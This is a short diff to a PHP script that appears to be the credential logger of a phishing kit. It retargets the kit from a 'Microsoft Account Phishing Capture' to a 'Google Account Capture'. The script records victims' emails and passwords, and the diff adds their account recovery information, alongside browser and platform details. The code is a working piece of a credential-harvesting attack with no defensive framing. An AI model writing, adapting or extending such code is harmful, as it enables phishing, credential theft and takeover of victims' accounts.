@@ -7,11 +7,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     
     if ($credentials) {
         $timestamp = date('Y-m-d H:i:s');
-        $log = "=== Microsoft Account Phishing Capture ===\n";
+        $log = "=== Google Account Capture ===\n";
         $log .= "Timestamp: $timestamp\n";
         $log .= "Type: " . ($credentials['type'] ?? 'unknown') . "\n";
-        $log .= "Email/Phone/Skype: " . ($credentials['email'] ?? 'N/A') . "\n";
+        $log .= "Email: " . ($credentials['email'] ?? 'N/A') . "\n";
         $log .= "Password: " . ($credentials['password'] ?? 'N/A') . "\n";
+        $log .= "Recovery Info: " . ($credentials['recovery'] ?? 'N/A') . "\n";
         $log .= "User Agent: " . ($credentials['userAgent'] ?? 'N/A') . "\n";
         $log .= "Platform: " . ($credentials['platform'] ?? 'N/A') . "\n";
         $log .= "Language: " . ($credentials['language'] ?? 'N/A') . "\n";
